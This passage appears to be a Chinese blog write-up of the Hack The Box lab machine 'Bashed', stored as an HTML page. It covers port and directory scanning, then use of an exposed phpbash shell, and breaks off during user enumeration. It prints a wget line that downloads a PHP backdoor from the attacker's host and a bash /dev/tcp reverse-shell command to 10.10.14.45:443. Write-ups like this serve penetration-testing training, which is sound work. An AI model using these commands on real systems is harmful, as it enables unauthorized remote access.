@@ -1,0 +1,797 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：目录扫描、文件上传、sudo、py脚本分析、suid">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bashed-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/05/20/Bashed-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：目录扫描、文件上传、sudo、py脚本分析、suid">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Bashed-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Bashed-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Bashed-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Bashed-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Bashed-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Bashed-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Bashed-htb-writeup/7.png">
+<meta property="article:published_time" content="2024-05-20T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-05-23T08:37:29.767Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Bashed-htb-writeup/1.png">
+  
+  
+  
+  <title>Bashed-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Bashed-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-20 23:50" pubdate>
+          2024年5月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          25k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          209 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Bashed-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：目录扫描、文件上传、sudo、py脚本分析、suid</p>
+<span id="more"></span>  
+
+<p>参考链接：无</p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.68</p>
+<p>2、探测下开放端口情况：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> -oG allports <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.68</span>                  <br>[sudo] kali 的密码：<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-19 23:11 CST</span><br>Warning: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.68</span> giving up on port because retransmission cap hit (<span class="hljs-number">10</span>).<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.68</span><br>Host is up (<span class="hljs-number">0.32</span>s latency).<br>Not shown: <span class="hljs-number">64287</span> closed tcp ports (reset), <span class="hljs-number">1247</span> filtered tcp ports (no-response)<br>PORT   STATE SERVICE<br><span class="hljs-number">80</span>/tcp open  http<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">43.88</span> seconds<br>                                                                                                                                                                                        <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> -oG allports1 <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.68</span> -sU<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-19 23:13 CST</span><br>Warning: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.68</span> giving up on port because retransmission cap hit (<span class="hljs-number">10</span>).<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.68</span><br>Host is up (<span class="hljs-number">0.43</span>s latency).<br>All <span class="hljs-number">65535</span> scanned ports on <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.68</span> are in ignored states.<br>Not shown: <span class="hljs-number">65444</span> open|filtered udp ports (no-response), <span class="hljs-number">91</span> closed udp ports (port-unreach)<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">78.15</span> seconds<br>                                                                                                                                                                                        <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p80 --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.68</span> -sV -sC<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-19 23:26 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.68</span><br>Host is up (<span class="hljs-number">1.2</span>s latency).<br><br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.18</span> ((Ubuntu))<br>|_http-title: Arrexel<span class="hljs-number">&#x27;</span>s Development Site<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.18</span> (Ubuntu)<br><br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">19.73</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、只有1个端口开放，那就查看下网站信息吧</p>
+<p><code>http://10.10.10.68/</code></p>
+<p><img src="http://sh1yan.top/photo/Bashed-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">phpbash对pentesting有很大帮助。我已经在多个不同的服务器上测试过了，它非常有用。实际上我是在这个服务器上开发的！<br></code></pre></td></tr></table></figure>
+
+<p><code>http://10.10.10.68/single.html</code></p>
+<p><img src="http://sh1yan.top/photo/Bashed-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">phpbash对pentesting有很大帮助。我已经在多个不同的服务器上测试过了，它非常有用。实际上我是在这个服务器上开发的！<br></code></pre></td></tr></table></figure>
+
+<p><code>https://github.com/Arrexel/phpbash</code></p>
+<p>4、这里的截图显示是一个shell的功能界面，再查看下这个github的内容</p>
+<p><code>https://github.com/Arrexel/phpbash</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">phpbash.min.php<br><br>phpbash.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Bashed-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>5、简单目录扫描一下吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ dirsearch -u http:<span class="hljs-comment">//10.10.10.68/  -e .php                                                                                          </span><br><br>  _|. _ _  _  _  _ _|_    v0<span class="hljs-number">.4</span><span class="hljs-number">.3</span><br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php | HTTP method: GET | Threads: <span class="hljs-number">25</span> | Wordlist size: <span class="hljs-number">9411</span><br><br>Output File: /home/kali/Desktop/reports/http_10<span class="hljs-number">.10</span><span class="hljs-number">.10</span><span class="hljs-number">.68</span>/__24<span class="hljs-number">-05</span><span class="hljs-number">-19</span>_23<span class="hljs-number">-34</span><span class="hljs-number">-49.</span>txt<br><br>Target: http:<span class="hljs-comment">//10.10.10.68/</span><br><br>[<span class="hljs-number">23</span>:<span class="hljs-number">34</span>:<span class="hljs-number">49</span>] Starting: <br>[<span class="hljs-number">23</span>:<span class="hljs-number">34</span>:<span class="hljs-number">53</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">308B</span>  - /php  -&gt;  http:<span class="hljs-comment">//10.10.10.68/php/</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">36</span>:<span class="hljs-number">12</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0B</span>  - /config.php                                       <br>[<span class="hljs-number">23</span>:<span class="hljs-number">36</span>:<span class="hljs-number">18</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">308B</span>  - /css  -&gt;  http:<span class="hljs-comment">//10.10.10.68/css/                 </span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">36</span>:<span class="hljs-number">22</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">479B</span>  - /dev/                                             <br>[<span class="hljs-number">23</span>:<span class="hljs-number">36</span>:<span class="hljs-number">22</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">308B</span>  - /dev  -&gt;  http:<span class="hljs-comment">//10.10.10.68/dev/                 </span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">36</span>:<span class="hljs-number">37</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">310B</span>  - /fonts  -&gt;  http:<span class="hljs-comment">//10.10.10.68/fonts/             </span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">36</span>:<span class="hljs-number">43</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">513B</span>  - /images/                                          <br>[<span class="hljs-number">23</span>:<span class="hljs-number">36</span>:<span class="hljs-number">43</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">311B</span>  - /images  -&gt;  http:<span class="hljs-comment">//10.10.10.68/images/           </span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">36</span>:<span class="hljs-number">49</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">307B</span>  - /js  -&gt;  http:<span class="hljs-comment">//10.10.10.68/js/                   </span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">36</span>:<span class="hljs-number">49</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">660B</span>  - /js/                                              <br>[<span class="hljs-number">23</span>:<span class="hljs-number">37</span>:<span class="hljs-number">13</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">454B</span>  - /php/                                             <br>[<span class="hljs-number">23</span>:<span class="hljs-number">37</span>:<span class="hljs-number">34</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">300B</span>  - /server-status/                                   <br>[<span class="hljs-number">23</span>:<span class="hljs-number">37</span>:<span class="hljs-number">34</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">299B</span>  - /server-status                                    <br>[<span class="hljs-number">23</span>:<span class="hljs-number">37</span>:<span class="hljs-number">53</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">14B</span>  - /uploads/                                         <br>[<span class="hljs-number">23</span>:<span class="hljs-number">37</span>:<span class="hljs-number">53</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">312B</span>  - /uploads  -&gt;  http:<span class="hljs-comment">//10.10.10.68/uploads/         </span><br>                                                                             <br>Task Completed<br></code></pre></td></tr></table></figure>
+
+<p>6、发现一个dev的目录，访问下看看</p>
+<p><code>http://10.10.10.68/dev/</code> </p>
+<p><img src="http://sh1yan.top/photo/Bashed-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>7、简单 尝试，发现无法通过bash反弹过来shell，那只能上次NC试试了，结果，默认的nc 没有-e  参数，看来不行。</p>
+<p><img src="http://sh1yan.top/photo/Bashed-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Bashed-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">www-data@bashed<br>:/var/www/html/dev<span class="hljs-meta"># wget http:<span class="hljs-comment">//10.10.14.45/qsd-php-backdoor.php</span></span><br><br>-<span class="hljs-number">-2024</span><span class="hljs-number">-05</span><span class="hljs-number">-19</span> <span class="hljs-number">00</span>:<span class="hljs-number">55</span>:<span class="hljs-number">31</span>-- http:<span class="hljs-comment">//10.10.14.45/qsd-php-backdoor.php</span><br>Connecting to <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>:<span class="hljs-number">80.</span>.. connected.<br>HTTP request sent, awaiting response... <span class="hljs-number">200</span> OK<br>Length: <span class="hljs-number">13585</span> (<span class="hljs-number">13</span>K) [application/octet-stream]<br>qsd-php-backdoor.php: Permission denied<br><br>Cannot write to <span class="hljs-string">&#x27;qsd-php-backdoor.php&#x27;</span> (Success).<br></code></pre></td></tr></table></figure>
+
+<p>8、在枚举尝试中，发现我们对 uploads 目录有写入权限，下面我们把WEBshell写入到这个目录里</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">www-data@bashed<br>:/var/www/html<span class="hljs-meta"># cd uploads</span><br><br>www-data@bashed<br>:/var/www/html/uploads<span class="hljs-meta"># ls -la</span><br><br>total <span class="hljs-number">12</span><br>drwxrwxrwx <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">2</span> <span class="hljs-number">2022</span> .<br>drw-r-xr-x <span class="hljs-number">10</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">2</span> <span class="hljs-number">2022</span> ..<br>-rwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">14</span> Dec <span class="hljs-number">4</span> <span class="hljs-number">2017</span> index.html<br>www-data@bashed<br>:/var/www/html/uploads<span class="hljs-meta"># wget http:<span class="hljs-comment">//10.10.14.45/qsd-php-backdoor.php</span></span><br><br>-<span class="hljs-number">-2024</span><span class="hljs-number">-05</span><span class="hljs-number">-19</span> <span class="hljs-number">01</span>:<span class="hljs-number">00</span>:<span class="hljs-number">30</span>-- http:<span class="hljs-comment">//10.10.14.45/qsd-php-backdoor.php</span><br>Connecting to <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>:<span class="hljs-number">80.</span>.. connected.<br>HTTP request sent, awaiting response... <span class="hljs-number">200</span> OK<br>Length: <span class="hljs-number">13585</span> (<span class="hljs-number">13</span>K) [application/octet-stream]<br>Saving to: <span class="hljs-string">&#x27;qsd-php-backdoor.php&#x27;</span><br><br><span class="hljs-number">0</span>K .......... ... <span class="hljs-number">100</span>% <span class="hljs-number">33.9</span>K=<span class="hljs-number">0.4</span>s<br><br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-19</span> <span class="hljs-number">01</span>:<span class="hljs-number">00</span>:<span class="hljs-number">31</span> (<span class="hljs-number">33.9</span> KB/s) - <span class="hljs-string">&#x27;qsd-php-backdoor.php&#x27;</span> saved [<span class="hljs-number">13585</span>/<span class="hljs-number">13585</span>]<br><br>www-data@bashed<br>:/var/www/html/uploads<span class="hljs-meta"># ls</span><br><br>index.html<br>qsd-php-backdoor.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Bashed-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>9、这里就直接尝试反弹shell</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">http:<span class="hljs-comment">//10.10.10.68/uploads/qsd-php-backdoor.php</span><br><br>bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.45/443 0&gt;&amp;1&quot;</span><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ rlwrap nc -lnvp <span class="hljs-number">443</span>                                                                                            <br>listening on [any] <span class="hljs-number">443</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.68</span>] <span class="hljs-number">34302</span><br>bash: cannot <span class="hljs-built_in">set</span> terminal process <span class="hljs-title function_">group</span> <span class="hljs-params">(<span class="hljs-number">821</span>)</span>: Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control in this shell<br>www-data@bashed:/var/www/html/uploads$ id<br>id<br>uid=<span class="hljs-number">33</span>(www-data) gid=<span class="hljs-number">33</span>(www-data) groups=<span class="hljs-number">33</span>(www-data)<br>www-data@bashed:/var/www/html/uploads$ <br></code></pre></td></tr></table></figure>
+
+<p>10、然后就获取到第一个flag信息了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">www-data@bashed:/var/www$ ls -la<br>ls -la<br>total <span class="hljs-number">12</span><br>drwxr-xr-x  <span class="hljs-number">3</span> root root <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> .<br>drwxr-xr-x <span class="hljs-number">12</span> root root <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> ..<br>drw-r-xr-x <span class="hljs-number">10</span> root root <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> html<br>www-data@bashed:/var/www$ ls -la /home<br>ls -la /home<br>total <span class="hljs-number">16</span><br>drwxr-xr-x  <span class="hljs-number">4</span> root          root          <span class="hljs-number">4096</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> .<br>drwxr-xr-x <span class="hljs-number">23</span> root          root          <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> ..<br>drwxr-xr-x  <span class="hljs-number">4</span> arrexel       arrexel       <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> arrexel<br>drwxr-xr-x  <span class="hljs-number">3</span> scriptmanager scriptmanager <span class="hljs-number">4096</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> scriptmanager<br>www-data@bashed:/var/www$ <br><br>www-data@bashed:/var/www$ cd /home/arrexel<br>cd 